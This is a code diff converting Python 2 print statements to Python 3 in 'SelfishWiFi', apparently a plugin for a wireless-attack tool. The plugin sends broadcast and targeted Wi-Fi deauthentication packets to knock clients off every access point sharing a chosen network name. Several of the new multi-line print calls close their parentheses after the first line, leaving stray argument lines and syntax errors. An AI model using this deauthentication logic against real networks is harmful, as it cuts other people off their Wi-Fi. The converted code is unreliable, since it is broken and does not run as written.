@@ -52,8 +52,8 @@ class SelfishWiFi(AirScannerPlugin):
                 print e
                 traceback.print_exc()
         except Exception as e:
-            print "Exception: {}".format(e)
-            print "[-] Stopping deauthentication."
+            print ("Exception: {}".format(e))
+            print ("[-] Stopping deauthentication.")
 
     def general_deauth_attack(self, bssid):
         deauth_packets = self.craft_deauth_packets("FF:FF:FF:FF:FF:FF", bssid)
@@ -68,7 +68,7 @@ class SelfishWiFi(AirScannerPlugin):
             try:
                 for bssid in self.deauth_bssids:
                     for client in self.clients_to_deauth:
-                        print "[+] Periodic attack on {} vs {}".format(client, self.deauth_ssid)
+                        print ("[+] Periodic attack on {} vs {}".format(client, self.deauth_ssid))
                         SessionManager().log_event(NeutralEvent(
                                                   "Periodic attack on {} vs {}".format(client, self.deauth_ssid)))
                         self.reactive_attack(client, bssid)
@@ -106,27 +106,28 @@ class SelfishWiFi(AirScannerPlugin):
 
             # When multiple access points have same ssid they are deauthed and logged
             if parsed_packet.bssid not in self.deauth_bssids:
-                print "[+] Adding '{}' to the access points to deauthenticate list.".format(parsed_packet.bssid)
-                print "[+] Initial general Deauthentication attack on {}({}) started".format(self.deauth_ssid,
+                print ("[+] Adding '{}' to the access points to deauthenticate list.".format(parsed_packet.bssid))
+                print ("[+] Initial general Deauthentication attack on {}({}) started".format(self.deauth_ssid,)
                                                                                              parsed_packet.bssid)
                 self.general_deauth_attack(parsed_packet.bssid)
                 self.general_deauth_attack_completed = True
-                print "[+] General Deauthentication attack on {}({}) finished".format(  self.deauth_ssid,
+                print ("[+] General Deauthentication attack on {}({}) finished".format(  self.deauth_ssid,)
                                                                                         parsed_packet.bssid)
 
             self.deauth_bssids.add(parsed_packet.bssid)  # Sets don't duplicate, no need to check
             if parsed_packet.client_mac not in self.deauth_bssids:  # May have parsed client as bssid
                 self.clients_to_deauth.add(parsed_packet.client_mac)
 
-            print "[+] Saw a {packet} packet from {ssid} to {mac}({vendor})".format(packet = parsed_packet.__class__.__name__,
+            print ("[+] Saw a {packet} packet from {ssid} to {mac}({vendor})".format(packet = parsed_packet.__class__.__name__,)
                                                                                     mac = parsed_packet.client_mac,
                                                                                     vendor = parsed_packet.client_vendor,
                                                                                     ssid = parsed_packet.ssid)
 
-            print "[+] Breaking up {mac}({vendor}) and {ssid}".format(  mac = parsed_packet.client_mac,
+            print ("[+] Breaking up {mac}({vendor}) and {ssid}".format(  mac = parsed_packet.client_mac,)
                                                                         vendor = parsed_packet.client_vendor,
                                                                         ssid = parsed_packet.ssid)
             self.reactive_attack(parsed_packet.client_mac, parsed_packet.bssid)
             SessionManager().log_event(NeutralEvent(
                                       "Reactive attack on {} vs {}"
                                       .format(parsed_packet.client_mac, parsed_packet.bssid)))
+
